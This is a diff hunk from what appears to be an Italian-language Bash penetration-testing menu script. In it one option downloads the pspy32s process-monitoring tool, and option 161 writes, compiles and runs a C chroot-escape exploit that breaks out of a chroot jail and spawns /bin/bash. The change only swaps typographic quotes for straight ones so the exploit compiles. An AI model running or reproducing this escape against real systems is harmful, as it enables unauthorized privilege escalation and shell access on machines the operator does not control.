@@ -575,7 +575,7 @@ while true; do
 		Scarica "DominicBreuker/pspy32s" "$ENTSSL""DominicBreuker/pspy/releases/download/v1.1.0/pspy32s" "pspy32s"
 	;;
 	"161")
-		echo -e "#include <sys/stat.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void){\nmkdir(\“chroot-dir\”, 0755);\nchroot(\“chroot-dir\”);\nfor(int i = 0; i < 1000; i++){\nchdir(\“..\”);\n}\nchroot(\“.\”);\nsystem(\“/bin/bash\”);\n}" > root4.c
+		echo -e "#include <sys/stat.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void){\nmkdir(\"chroot-dir\", 0755);\nchroot(\"chroot-dir\");\nfor(int i = 0; i < 1000; i++){\nchdir(\"..\");\n}\nchroot(\".\");\nsystem(\"/bin/bash\");\n}" > root4.c
 		gcc root4.c -o root4
 		chmod +x root4
 		./root4
